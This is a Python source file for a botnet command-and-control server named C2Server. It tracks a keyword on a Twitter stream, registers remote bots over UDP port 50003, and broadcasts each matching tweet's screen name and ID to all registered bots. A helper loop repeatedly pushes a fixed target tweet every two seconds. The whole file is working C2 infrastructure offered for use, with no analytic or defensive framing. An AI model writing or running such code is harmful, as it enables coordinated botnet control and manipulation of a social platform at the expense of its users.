import sys
import time
import socket
import tweepy
from threading import Thread


class C2Server(tweepy.StreamListener):

    def __init__(self):
        self.bot_list = []
        self.__initialize_api()
        self.__validate_login()
        
        Thread(target = self.register_bot).start()

        self.tweet_stream = tweepy.Stream(self.api.auth, self)
        self.tweet_stream.filter(track=['mariconnors'], is_async=True)

    def __initialize_api(self):
        self.__print_separator()
        print("Initializing Twitter bot. . .")

        with open("./src/resources/api_keys", "r") as keys:
            try:
                print("Attempting to read API keys file. . .")

                file_content = keys.readlines()
                consumer_key = file_content[0].replace("\n", "")
                consumer_secret = file_content[1].replace("\n", "")
                access_token_key = file_content[2].replace("\n", "")
                access_token_secret = file_content[3].replace("\n", "")

                auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
                auth.set_access_token(access_token_key, access_token_secret)

                self.api = tweepy.API(auth, wait_on_rate_limit=True, wait_on_rate_limit_notify=True)

            except SystemExit:
                sys.exit(-1)
            except:
                print("Error while reading API keys from file, program will terminate")
                sys.exit(-1)

    def __validate_login(self):
        print("Verifying credentials. . .")

        if self.api.verify_credentials():
            print("Authentication OK")
            self.__print_separator()
        else:
            print("Error during authentication, program will terminate")
            sys.exit(-1)

    def on_status(self, status):
        if not hasattr(status, "retweeted_status"):
            self.send_command(f"{status.user.screen_name}|{status.id}")

    def on_error(self, status_code):
        if status_code == 420:
            return False

    def register_bot(self):
        self.__print_separator()
        print("Launched a thread to listen for incoming bot subscriptions. . .")
        self.__print_separator()
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock_recv:
                    sock_recv.bind(("0.0.0.0", 50003))
                    data, addr = sock_recv.recvfrom(1024)
                    data = data.decode("utf-8")
                    
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock_send:
                    sock_send.sendto(b"200", (addr[0], int(data)))
                    self.bot_list.append(f"{addr[0]}:{data}")
                    self.__print_separator()
                    print(f"Added new bot to active bot list: {addr[0]}:{data}")
                    self.__print_separator()
            except:
                continue

    def send_command(self, command):
            print(f"Sending command: {command}")
            self.__print_separator()

            with (socket.socket(socket.AF_INET, socket.SOCK_DGRAM)) as sock:
                for bot in self.bot_list:
                    bot = bot.split(":")
                    sock.sendto(command.encode("utf-8"), (bot[0], int(bot[1])))
    
    def __print_separator(self):
        print("\n---------------------\n")

    def foo(self):
        while not self.bot_list:
            time.sleep(0.05)
        
        while True:
            self.send_command("nullpointer33|1423287122681729032")
            time.sleep(2)

if __name__ == '__main__':
    C2Server()